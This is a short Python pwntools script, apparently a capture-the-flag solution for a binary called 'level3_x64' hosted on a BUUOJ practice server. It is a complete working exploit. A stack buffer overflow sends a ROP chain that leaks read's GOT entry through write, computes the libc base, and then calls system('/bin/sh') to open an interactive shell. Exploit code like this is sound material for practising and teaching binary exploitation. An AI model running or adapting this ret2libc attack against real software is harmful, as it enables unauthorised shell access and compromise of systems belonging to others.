import sys
from pwn import *
context.log_level='debug'
#context.arch='amd64'
while True :
	# try :
		if len(sys.argv)==1 :
			io=process('./level3_x64')
			# io=process(['./'],env={'LD_PRELOAD':'./'})
			elf=ELF('./level3_x64')
			libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
		else :
			io=remote('node3.buuoj.cn',26415)
			elf=ELF('./level3_x64')
			libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')

		


		io.recv()
		gdb.attach(io,'b *0x400618')
		pop_rdi=0x00000000004006b3
		pop_rsi_r15=0x00000000004006b1
		main_addr=0x40061a
		pay='a'*0x88+p64(pop_rdi)+p64(1)+p64(pop_rsi_r15)+p64(elf.got['read'])+p64(0x10)+p64(elf.sym['write'])+p64(main_addr)
		
		io.send(pay)
		libc_base=u64(io.recv()[:8])-libc.sym['read']
		libc.address=libc_base
		pay='a'*0x88+p64(pop_rdi)+p64(libc.search('/bin/sh\x00').next())+p64(libc.sym['system'])+p64(main_addr)
		io.send(pay)

		
		# pause()
		io.interactive()

	# except Exception as e:
	# 	io.close()
	# 	continue
	# else:
	# 	continue